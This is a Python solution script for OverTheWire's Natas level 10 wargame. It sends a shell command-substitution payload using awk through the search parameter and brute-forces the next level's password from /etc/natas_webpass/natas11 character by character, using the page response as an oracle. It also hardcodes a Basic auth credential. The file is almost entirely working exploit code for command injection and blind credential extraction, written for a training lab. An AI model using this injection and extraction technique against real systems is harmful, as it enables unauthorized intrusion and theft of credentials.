import requests
import string
import time

password = ''
PASSWORD_DIR = '/etc/natas_webpass/natas11'     # we found out this directory in previous levels hints
LETTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits       # this const contains all possible letters in natas passowrds


HEADERS = {
    'Authorization': 'Basic bmF0YXMxMDpENDRFY3NGa0x4UElrQUFLTG9zeDh6M2h4WDFaNE1DRQ=='
    # this header is required to login (contains the password of previous level)
}


start_time = time.time()    # just to check how long does it take
while len(password) != 32:      # because the passwords in this site has a fixed length
    for i in LETTERS:
        tmp_password = password + i     # create new temp password to test
        key = f" $(awk '/^{tmp_password}/{{isCorrect=\"yes\"}} END {{ if (isCorrect==\"yes\") print \"e\" }}' {PASSWORD_DIR}) "     # explained below
        url = f'http://natas10.natas.labs.overthewire.org/?needle={key}&submit=Search'      # level url + input value
        resaults = requests.get(url , headers=HEADERS)      # save the resault for new temp_password
        print(' PASSWORD: ',password, i, end='\r', sep='') 
        if 'Christianities' in resaults.content.decode() or resaults.status_code != 200:    # check if resault is like when we search about the letter 'e'
            password = tmp_password     # if true add the letter to actual password
            break   #   need to restart the loop for next letter
end_time = time.time()      # just to check how long does it take


print('', end='\r')
print()
print('--------------------------------------')
print(password)
print('--------------------------------------')
print(f'found in {end_time - start_time}')

"""
    in line 21 we put our command in input,
    the command is $(second command)
    and it will replace the returned value of second command to $(),
    in second command i used awk, the syntax is awk 'string',
    in the string you have awk '{condition} END {final condition}' file,
    where file was my next level password file
    in the beggining i used a regex to check if the password starts with tmp_password,
    then i declared a variable and put its value to "yes",
    then in the end i check if my variable(called isCorrect) was equal to "yes",
    return the letter 'e'
"""
